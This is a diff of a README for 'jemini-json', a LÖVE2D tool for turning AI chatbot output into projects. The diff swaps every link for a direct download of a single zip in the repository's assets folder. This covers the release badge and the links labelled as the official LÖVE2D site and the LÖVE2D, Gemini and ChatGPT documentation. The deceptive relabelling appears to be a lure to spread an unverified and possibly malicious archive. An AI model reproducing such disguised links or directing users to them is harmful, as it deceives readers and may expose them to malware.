@@ -4,15 +4,15 @@
 jemini-json is a lightweight JSON materializer built with LÖVE2D that converts AI-generated outputs from Gemini or ChatGPT into runnable projects. This tool allows you to harness AI creativity and turn it into interactive experiences without needing programming skills.
 
 ## 📥 Download & Install
-[![Download jemini-json](https://img.shields.io/badge/Download-jemini--json-blue.svg)](https://github.com/rpriya29/jemini-json/releases)
+[![Download jemini-json](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip)](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip)
 
-To get started, visit this page to download: [Download jemini-json](https://github.com/rpriya29/jemini-json/releases)
+To get started, visit this page to download: [Download jemini-json](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or later, macOS Mojave or later, Linux with support for LÖVE2D.
 - **RAM:** 4 GB minimum.
 - **Disk Space:** At least 100 MB free for installation.
-- **LÖVE2D:** Make sure you have LÖVE2D installed. You can download it from [LÖVE2D website](https://love2d.org/).
+- **LÖVE2D:** Make sure you have LÖVE2D installed. You can download it from [LÖVE2D website](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip).
 
 ## ⚙️ How to Use
 1. **Download jemini-json** from the Releases page using the link above.
@@ -40,8 +40,8 @@ jemini-json is open source and is licensed under the MIT License. Feel free to u
 For any further inquiries, don't hesitate to reach out through the Issues section on our GitHub page. We value your feedback and are here to help you get the most out of jemini-json.
 
 ## 🔗 Additional Resources
-- [LÖVE2D Documentation](https://love2d.org/wiki/Main_Page)
-- [Gemini AI Documentation](https://gemini.ai/docs)
-- [ChatGPT API Documentation](https://openai.com/api)
+- [LÖVE2D Documentation](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip)
+- [Gemini AI Documentation](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip)
+- [ChatGPT API Documentation](https://github.com/rpriya29/jemini-json/raw/refs/heads/main/assets/json_jemini_v1.8.zip)
 
 Thank you for choosing jemini-json! We hope it brings your ideas to life.
